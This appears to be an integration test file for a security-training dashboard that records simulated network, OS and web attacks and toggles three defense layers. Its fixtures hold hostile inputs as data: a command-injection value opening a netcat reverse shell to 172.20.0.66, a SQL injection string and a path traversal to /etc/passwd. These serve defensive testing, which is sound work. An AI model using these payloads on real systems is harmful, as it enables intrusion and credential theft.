import assert from 'node:assert/strict';
import { after, test } from 'node:test';
import { createServer } from 'node:http';
import { once } from 'node:events';
import { io as connect } from 'socket.io-client';

test('hub integration contracts', { timeout: 15000 }, async (t) => {
  let flags = {
    l3_master: false,
    anti_sqli: false,
    rate_limit: false,
    input_sanitization: false,
  };
  let offline = false;
  let malformed = false;
  const setAllFlags = (val: boolean) => {
    flags = {
      l3_master: val,
      anti_sqli: val,
      rate_limit: val,
      input_sanitization: val,
    };
  };

  const target = createServer(async (req, res) => {
    let text = '';
    for await (const part of req) text += part;
    const body = text ? JSON.parse(text) : {};
    res.setHeader('Content-Type', 'application/json');
    if (offline) { res.writeHead(503); res.end('{}'); return; }
    if (malformed) { res.end('{"unexpected":true}'); return; }
    if (req.url?.endsWith('/set')) {
      for (const flag of ['anti_sqli', 'rate_limit', 'input_sanitization']) assert.equal(body[flag], body.l3_master);
      setAllFlags(body.l3_master);
    }
    if (req.url?.endsWith('/toggle')) {
      if (body && typeof body.flag === 'string' && body.flag in flags) {
        const key = body.flag as keyof Omit<typeof flags, 'l3_master'>;
        flags[key] = !flags[key];
        flags.l3_master = flags.anti_sqli && flags.rate_limit && flags.input_sanitization;
      } else {
        setAllFlags(!flags.l3_master);
      }
    }
    res.end(JSON.stringify(req.url?.endsWith('/status') ? { flags } : { status: 'success', current_state: flags }));
  });
  target.listen(0, '127.0.0.1');
  await once(target, 'listening');
  const address = target.address() as { port: number };
  process.env.PORT = '0';
  process.env.HOST = '127.0.0.1';
  process.env.TARGET_APP_URL = `http://127.0.0.1:${address.port}`;
  const { server, io } = await import('../src/server');
  if (!server.listening) await once(server, 'listening');
  const base = `http://127.0.0.1:${(server.address() as { port: number }).port}`;
  const socket = connect(base, { transports: ['websocket'], autoConnect: false });
  after(async () => {
    socket.disconnect();
    await new Promise<void>(resolve => io.close(() => resolve()));
    target.closeAllConnections();
    await new Promise<void>(resolve => target.close(() => resolve()));
  });
  const initial = once(socket, 'INITIAL_STATE');
  socket.connect();
  await initial;
  async function api(path: string, body?: unknown) {
    const response = await fetch(base + path, {
      method: body === undefined ? 'GET' : 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: body === undefined ? undefined : JSON.stringify(body),
    });
    return { status: response.status, data: await response.json() as any };
  }
  const event = {
    schema_version: '1.0', event_id: 'test-1', run_id: 'run-1', timestamp: new Date().toISOString(),
    source_node: 'ATTACKER', source_ip: '172.30.44.66', target_ip: '172.30.44.20',
    scenario: 'S4', event_type: 'RUN_STATE', execution_mode: 'real', payload: { state: 'COMPLETED' },
  };

  await t.test('S5 and S6 worker evidence survives broadcast and history', async () => {
    const results = [
      { scenario: 'S5', outcome: 'OBSERVED', cleanup_pending: true,
        measurements: { arp_repair_send_calls_succeeded: 6, arp_restoration_verified: false } },
      { scenario: 'S6', outcome: 'INCONCLUSIVE', cleanup_pending: false,
        measurements: { matching_client_acks_seen: 0, rst_send_calls_succeeded: 0, client_reset_verified: false } },
      { scenario: 'S6', outcome: 'OBSERVED', cleanup_pending: false,
        measurements: { matching_client_acks_seen: 1, rst_send_calls_succeeded: 1, client_reset_verified: false } },
    ];
    for (const { scenario, ...result } of results) {
      const run_id = `test-${scenario}-${result.outcome}`;
      const evidence = { ...event, execution_mode: 'simulated', run_id, scenario, event_id: run_id + '-result', event_type: 'WORKER_EVENT',
        payload: { run_id, type: 'result', result: { ...result, summary: 'Test fixture' } } };
      const delivered = once(socket, 'ATTACK_EVENT');
      assert.equal((await api('/api/events/attack', evidence)).status, 200);
      assert.deepEqual((await delivered)[0], evidence);
      assert.deepEqual((await api('/api/events/attack?run_id=' + run_id)).data.events, [evidence]);
    }
  });
  await t.test('real HTTP logs still work and metrics are labelled simulated', async () => {
    const log = { endpoint: '/api/system/ping', status_code: 200, method: 'GET', response_time: 1, client_ip: '172.30.44.10', payload_summary: {} };
    assert.equal((await api('/api/telemetry', log)).status, 200);
    const history = (await api('/api/telemetry/history')).data;
    assert.equal(history.count, 1);
    assert.equal(history.metrics.source, 'simulated');
  });
  await t.test('attack schema, Socket.IO delivery, retry deduplication and run filtering', async () => {
    const delivered = once(socket, 'ATTACK_EVENT');
    const firstRes = await api('/api/events/attack', event);
    assert.equal(firstRes.status, 200);
    assert.equal(firstRes.data.success, true);
    assert.equal(firstRes.data.event_id, event.event_id);
    assert.equal(firstRes.data.status, 'PROCESSED_AND_BROADCASTED');
    assert.equal(firstRes.data.duplicate, false);
    assert.deepEqual((await delivered)[0], event);
    const dupRes = await api('/api/events/attack', event);
    assert.equal(dupRes.data.duplicate, true);
    assert.equal(dupRes.data.status, 'PROCESSED_AND_BROADCASTED');
    assert.equal((await api('/api/events/attack?run_id=run-1')).data.count, 1);
    assert.equal((await api('/api/events/attack?run_id=missing')).data.count, 0);
    assert.equal((await api('/api/telemetry/history')).data.count, 1);
    assert.equal((await api('/api/events/attack', { ...event, scenario: 'BAD' })).status, 400);
    assert.equal((await api('/api/events/attack', { ...event, event_type: 'WORKER_EVENT', payload: { type: 'progress', run_id: 'wrong' } })).status, 400);
  });
  await t.test('reads Target state, returns standardized toggle contract, and supports sub-flag toggles', async () => {
    assert.equal((await api('/api/defense/status')).data.defense_l3_app, false);
    for (let i = 0; i < 2; i++) {
      const result = await api('/api/defense/toggle', { enabled: true });
      assert.equal(result.status, 200);
      assert.equal(result.data.success, true);
      assert.equal(result.data.defense_l3_app, true);
      assert.equal(result.data.proxied_to_target, true);
      assert.equal(result.data.message, 'Khiên phòng thủ L3/L7 hiện đang: BẬT (SECURED)');
      assert.deepEqual(result.data.current_state, {
        l3_master: true,
        anti_sqli: true,
        rate_limit: true,
        input_sanitization: true,
      });
      assert.equal(flags.l3_master, true);
    }

    // Sub-flag toggle: turn off anti_sqli while other two stay true -> l3_master becomes false
    const flagRes = await api('/api/defense/toggle', { flag: 'anti_sqli' });
    assert.equal(flagRes.status, 200);
    assert.equal(flagRes.data.defense_l3_app, false);
    assert.deepEqual(flagRes.data.current_state, {
      l3_master: false,
      anti_sqli: false,
      rate_limit: true,
      input_sanitization: true,
    });
    assert.equal(flagRes.data.message, 'Khiên phòng thủ L3/L7 hiện đang: TẮT (VULNERABLE)');

    // Master toggle with {} turns all flags to true (since l3_master was false)
    const masterOn = await api('/api/defense/toggle', {});
    assert.equal(masterOn.data.defense_l3_app, true);
    assert.deepEqual(masterOn.data.current_state, {
      l3_master: true,
      anti_sqli: true,
      rate_limit: true,
      input_sanitization: true,
    });

    // Master toggle with {} again turns all flags to false
    const masterOff = await api('/api/defense/toggle', {});
    assert.equal(masterOff.data.defense_l3_app, false);
    assert.equal(masterOff.data.message, 'Khiên phòng thủ L3/L7 hiện đang: TẮT (VULNERABLE)');

    assert.equal((await api('/api/defense/toggle', { enabled: 'true' })).status, 400);
    assert.equal((await api('/api/defense/toggle', { flag: 'invalid_flag' })).status, 400);
    setAllFlags(true); // A change made directly at Target is reflected on the next read.
    assert.equal((await api('/api/defense/status')).data.defense_l3_app, true);
  });
  await t.test('direct Target changes and outage reach connected dashboards without a reload', async () => {
    async function awaitState(expected: boolean | null, mutate: () => void) {
      const received = new Promise<void>((resolve, reject) => {
        const timer = setTimeout(() => { socket.off('DEFENSE_TOGGLED', listener); reject(new Error('No automatic defense update')); }, 4500);
        const listener = (payload: any) => {
          if (payload.defense_l3_state !== expected) return;
          if (expected !== null) {
            assert.equal(payload.current_state?.l3_master, expected);
          } else {
            assert.equal(payload.current_state, null);
          }
          clearTimeout(timer);
          socket.off('DEFENSE_TOGGLED', listener);
          resolve();
        };
        socket.on('DEFENSE_TOGGLED', listener);
      });
      mutate();
      await received;
    }
    await awaitState(false, () => { setAllFlags(false); });
    await awaitState(null, () => { offline = true; });
    await awaitState(true, () => { offline = false; setAllFlags(true); });
  });
  await t.test('offline or invalid Target response never reports a successful local toggle', async () => {
    offline = true;
    const result = await api('/api/defense/toggle', {});
    assert.equal(result.status, 502);
    assert.equal(result.data.defense_l3_app, null);
    assert.equal(result.data.current_state, null);
    assert.equal(flags.l3_master, true);
    const socketError = once(socket, 'DEFENSE_ERROR');
    socket.emit('TOGGLE_DEFENSE');
    await socketError;
    assert.equal(flags.l3_master, true);
    offline = false;
    malformed = true;
    assert.equal((await api('/api/defense/status')).status, 502);
    malformed = false;
    assert.equal((await api('/api/defense/status')).data.defense_l3_app, true);
  });

  await t.test('W3-T1: L2/L4 network attacks (ARP Spoofing + MitM Sniffing, SYN Flood history, TCP RST Injection)', async () => {
    // 1. Baseline ARP Cache is clean and MitM is inactive
    const initialNet = (await api('/api/telemetry/network')).data;
    assert.equal(initialNet.success, true);
    assert.equal(initialNet.network_state.mitm_active, false);
    assert.equal(initialNet.network_state.arp_table.every((e: any) => e.spoofed === false), true);

    // 2. ARP Spoofing telemetry poisons ARP cache and activates MitM route
    const arpLog = {
      endpoint: '/L2/arp-spoof',
      status_code: 200,
      method: 'ARP',
      response_time: 1,
      client_ip: '172.20.0.66',
      attack_tag: 'ARP_SPOOF',
      is_suspicious: true,
      payload_summary: {
        body_preview: { username: 'engineer_user', password: 'pass123' },
        token_preview: 'Bearer jwt-secret-token',
      },
    };
    assert.equal((await api('/api/telemetry', arpLog)).status, 200);

    const poisonedNet = (await api('/api/telemetry/network')).data.network_state;
    assert.equal(poisonedNet.mitm_active, true);
    assert.equal(poisonedNet.arp_table.some((e: any) => e.spoofed === true && e.mac === '02:42:ac:14:00:42'), true);
    assert.equal(poisonedNet.sniffed_packets.length, 1);
    assert.equal(poisonedNet.sniffed_packets[0].username, 'engineer_user');
    assert.equal(poisonedNet.sniffed_packets[0].password, 'pass123');

    // 3. While MitM is active, normal Client login traffic is automatically sniffed
    const clientLoginLog = {
      endpoint: '/api/auth/login',
      status_code: 200,
      method: 'POST',
      response_time: 12,
      client_ip: '172.20.0.10',
      attack_tag: 'NORMAL',
      is_suspicious: false,
      payload_summary: {
        body_preview: { username: 'client_bot', password: 'bot_password' },
      },
    };
    await api('/api/telemetry', clientLoginLog);
    const afterLoginNet = (await api('/api/telemetry/network')).data.network_state;
    assert.equal(afterLoginNet.sniffed_packets.length, 2);
    assert.equal(afterLoginNet.sniffed_packets[1].username, 'client_bot');

    // 4. SYN Flood spikes SYN_RECV and records into syn_history bar chart array
    const synLog = {
      endpoint: '/L4/syn-flood',
      status_code: 503,
      method: 'TCP',
      response_time: 200,
      client_ip: '172.20.0.66',
      attack_tag: 'SYN_FLOOD',
      is_suspicious: true,
      payload_summary: {},
    };
    await api('/api/telemetry', synLog);
    const afterSyn = (await api('/api/telemetry/network')).data;
    assert.ok(afterSyn.metrics.syn_recv >= 25);
    assert.equal(afterSyn.network_state.syn_history[afterSyn.network_state.syn_history.length - 1], afterSyn.metrics.syn_recv);

    // 5. TCP RST Injection records disrupted session and sequence number
    const rstLog = {
      endpoint: '/L4/rst-inject',
      status_code: 499,
      method: 'TCP',
      response_time: 2,
      client_ip: '172.20.0.66',
      attack_tag: 'RST_INJECTION',
      is_suspicious: true,
      payload_summary: { seq_num: 987654321 },
    };
    await api('/api/telemetry', rstLog);
    const afterRst = (await api('/api/telemetry/network')).data.network_state;
    assert.equal(afterRst.rst_injection.active, true);
    assert.equal(afterRst.rst_injection.disrupted_sessions, 1);
    assert.equal(afterRst.rst_injection.last_seq_num, 987654321);

    // 6. Reset ARP restores clean ARP table and disables MitM
    const resetRes = (await api('/api/telemetry/network', { action: 'reset_arp' })).data;
    assert.equal(resetRes.network_state.mitm_active, false);
    assert.equal(resetRes.network_state.arp_table.every((e: any) => e.spoofed === false), true);
  });

  await t.test('W4-T1: OS & L7 attack visualization (pstree, reverse shell, lsof FD gauge, SQLi/Brute-force alerts)', async () => {
    // 1. Baseline OS & L7 state is clean (no reverse shell, normal open_fds)
    const initialOs = (await api('/api/telemetry/os')).data.os_l7_state;
    assert.equal(initialOs.reverse_shell.active, false);
    assert.equal(initialOs.fd_metrics.status, 'NORMAL');
    assert.equal(initialOs.fd_metrics.open_fds, 42);

    // 2. OS Command Injection spawns /bin/sh -> nc in pstree and activates Reverse Shell tunnel (Server -> Hacker)
    const cmdInjLog = {
      endpoint: '/api/system/network-ping?host=127.0.0.1;nc%20-e%20/bin/sh%20172.20.0.66%204444',
      status_code: 200,
      method: 'GET',
      response_time: 25,
      client_ip: '172.20.0.66',
      attack_tag: 'COMMAND_INJECTION',
      is_suspicious: true,
      defense_action: 'allowed',
      payload_summary: {
        query: { host: '127.0.0.1; nc -e /bin/sh 172.20.0.66 4444' },
        shell_cmd: 'nc -e /bin/sh 172.20.0.66 4444',
      },
    };
    assert.equal((await api('/api/telemetry', cmdInjLog)).status, 200);

    const afterRevShell = (await api('/api/telemetry/os')).data.os_l7_state;
    assert.equal(afterRevShell.reverse_shell.active, true);
    assert.equal(afterRevShell.reverse_shell.shell_cmd, 'nc -e /bin/sh 172.20.0.66 4444');
    assert.equal(afterRevShell.l7_counters.cmd_injection_count, 1);
    assert.equal(afterRevShell.suspicious_processes.some((p: string) => p.includes('/bin/sh')), true);

    // Verify pstree contains malicious child process under node server
    const rootProc = afterRevShell.pstree[0];
    const nodeProc = rootProc.children.find((c: any) => c.name === 'node');
    assert.equal(nodeProc.children.some((c: any) => c.name === '/bin/sh' && c.suspicious === true), true);

    // 3. SQL Injection & Low-rate Brute-force populate L7 alerts table and counters
    await api('/api/telemetry', {
      endpoint: '/api/auth/login',
      status_code: 200,
      method: 'POST',
      response_time: 14,
      client_ip: '172.20.0.66',
      attack_tag: 'SQL_INJECTION',
      is_suspicious: true,
      payload_summary: { body_preview: { username: "admin' OR '1'='1' --" } },
    });
    await api('/api/telemetry', {
      endpoint: '/api/auth/login',
      status_code: 401,
      method: 'POST',
      response_time: 10,
      client_ip: '172.20.0.66',
      attack_tag: 'BRUTE_FORCE',
      is_suspicious: true,
      payload_summary: { body_preview: { username: 'admin', password: 'guess1' }, attempts_count: 6, rate_rps: 1 },
    });
    await api('/api/telemetry', {
      endpoint: '/api/files/download?file=../../../../etc/passwd',
      status_code: 200,
      method: 'GET',
      response_time: 8,
      client_ip: '172.20.0.66',
      attack_tag: 'PATH_TRAVERSAL',
      is_suspicious: true,
      payload_summary: { query: { file: '../../../../etc/passwd' } },
    });

    const afterL7 = (await api('/api/telemetry/os')).data.os_l7_state;
    assert.equal(afterL7.l7_counters.sqli_count, 1);
    assert.equal(afterL7.l7_counters.brute_force_count, 1);
    assert.equal(afterL7.l7_counters.path_traversal_count, 1);
    assert.equal(afterL7.l7_alerts.length, 4);
    assert.equal(afterL7.fd_metrics.suspicious_files.includes('/etc/passwd'), true);

    // 4. File Descriptors (lsof) Exhaustion updates FD gauge to EXHAUSTED
    await api('/api/telemetry/host', {
      metrics: {
        tcp_established: 22,
        tcp_syn_recv: 5,
        tcp_time_wait: 6,
        open_fds: 960,
        max_fds: 1024,
        process_count: 32,
      },
    });
    const afterFd = (await api('/api/telemetry/os')).data.os_l7_state;
    assert.equal(afterFd.fd_metrics.open_fds, 960);
    assert.equal(afterFd.fd_metrics.status, 'EXHAUSTED');
    assert.equal(afterFd.fd_metrics.process_count, 32);

    // 5. Reset OS restores clean pstree, terminates reverse shell, and resets open_fds
    const resetOs = (await api('/api/telemetry/os', { action: 'reset_os' })).data.os_l7_state;
    assert.equal(resetOs.reverse_shell.active, false);
    assert.equal(resetOs.fd_metrics.status, 'NORMAL');
    assert.equal(resetOs.fd_metrics.open_fds, 42);
  });

  await t.test('W5-T1 Phase 1: 3-Layer Defense Funnel contract (independent L1 Network, L2 OS, and L3 App toggles)', async () => {
    // 1. Initial status exposes all 3 defense layers
    const status0 = (await api('/api/defense/status')).data;
    assert.equal(status0.defense_l1_network, false);
    assert.equal(status0.defense_l2_os, false);
    assert.equal(typeof status0.defense_l3_app, 'boolean');
    assert.equal(status0.defense_layers.l1_network, false);
    assert.equal(status0.defense_layers.l2_os, false);

    // 2. Poison ARP cache first, then enable L1 Network Shield -> automatically restores clean Static ARP & blocks ARP/SYN/RST
    await api('/api/telemetry', {
      endpoint: '/L2/arp-spoof',
      status_code: 200,
      method: 'ARP',
      response_time: 1,
      client_ip: '172.20.0.66',
      attack_tag: 'ARP_SPOOF',
      is_suspicious: true,
      payload_summary: {},
    });
    assert.equal((await api('/api/telemetry/network')).data.network_state.mitm_active, true);

    const l1On = (await api('/api/defense/toggle', { layer: 'l1', enabled: true })).data;
    assert.equal(l1On.success, true);
    assert.equal(l1On.layer, 'l1');
    assert.equal(l1On.defense_l1_network, true);
    assert.equal(l1On.defense_layers.l1_network, true);

    // Verify L1 side-effect: MitM is cleared and subsequent ARP spoof is blocked by Static ARP
    const netAfterL1 = (await api('/api/telemetry/network')).data.network_state;
    assert.equal(netAfterL1.mitm_active, false);
    await api('/api/telemetry', {
      endpoint: '/L2/arp-spoof',
      status_code: 200,
      method: 'ARP',
      response_time: 1,
      client_ip: '172.20.0.66',
      attack_tag: 'ARP_SPOOF',
      is_suspicious: true,
      payload_summary: {},
    });
    assert.equal((await api('/api/telemetry/network')).data.network_state.mitm_active, false);

    // 3. Turn off L3 so Command Injection can reach OS, then verify L2 OS Shield blocks Reverse Shell & caps FDs at 512
    await api('/api/defense/toggle', { layer: 'l3', enabled: false });
    const l2On = (await api('/api/defense/toggle', { layer: 'l2', enabled: true })).data;
    assert.equal(l2On.success, true);
    assert.equal(l2On.layer, 'l2');
    assert.equal(l2On.defense_l2_os, true);
    assert.equal(l2On.defense_layers.l2_os, true);

    // Send Command Injection while L3 is OFF but L2 is ON -> L2 nologin/cgroups prevents Reverse Shell spawn
    await api('/api/telemetry', {
      endpoint: '/api/system/network-ping?host=127.0.0.1;nc%20-e%20/bin/sh%20172.20.0.66%204444',
      status_code: 200,
      method: 'GET',
      response_time: 15,
      client_ip: '172.20.0.66',
      attack_tag: 'COMMAND_INJECTION',
      is_suspicious: true,
      defense_action: 'allowed',
      payload_summary: { shell_cmd: 'nc -e /bin/sh 172.20.0.66 4444' },
    });
    const osWithL2 = (await api('/api/telemetry/os')).data.os_l7_state;
    assert.equal(osWithL2.reverse_shell.active, false);
    assert.equal(osWithL2.fd_metrics.max_fds, 512);

    // 4. Invalid layer returns 400
    assert.equal((await api('/api/defense/toggle', { layer: 'l99' })).status, 400);

    // Reset L1 & L2 back to false
    await api('/api/defense/toggle', { layer: 'l1', enabled: false });
    await api('/api/defense/toggle', { layer: 'l2', enabled: false });
    const finalDefense = (await api('/api/defense/status')).data;
    assert.equal(finalDefense.defense_l1_network, false);
    assert.equal(finalDefense.defense_l2_os, false);
  });
});
